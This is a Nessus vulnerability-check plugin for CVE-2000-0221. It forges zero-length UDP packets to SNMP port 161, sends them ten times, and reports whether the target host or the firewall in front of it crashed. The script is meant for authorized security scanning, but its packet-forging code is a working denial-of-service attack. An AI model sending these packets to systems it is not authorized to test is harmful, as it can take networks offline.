#
# (C) Tenable Network Security, Inc.
#

# Thanks to Christophe Grenier <grenier@esiea.fr> for pointing this out
#

include( 'compat.inc' );

if(description)
{
  script_id(10266);
  script_version ("$Revision: 1.15 $");
  script_cve_id("CVE-2000-0221");
  script_bugtraq_id(1009);
  script_xref(name:"OSVDB", value:"1232");

  script_name(english:"SNMP Zero Length UDP Packet Remote DoS");
  script_summary(english:"Crashes the remote host by sending a null UDP packet");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote host is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:'It was possible to crash either the remote host
or the firewall in between us and the remote host by
sending an UDP packet of null size going to port 161 (snmp)

This flaw may allow an attacker to shut down your network.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Contact your firewall vendor if it was the
firewall which crashed, or filter incoming UDP traffic if the remote host crashed.'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_family(english:"SNMP");
  script_require_keys("Settings/ParanoidReport");

  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

if ( TARGET_IS_IPV6 ) exit(0);

start_denial();


ip = forge_ip_packet(ip_v   : 4,
		     ip_hl  : 5,
		     ip_tos : 0,
		     ip_id  : 0x4321,
		     ip_len : 28,
		     ip_off : 0,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);

# Forge the UDP packet

udp = forge_udp_packet( ip : ip,
			uh_sport : 1234, uh_dport : 161,
			uh_ulen : 8);


#
# Send this packet 10 times
#

send_packet(udp, pcap_active:FALSE) x 10;

#
# wait
#
sleep(5);

#
# And check...
#
alive = end_denial();
if(!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_warning(161);
}
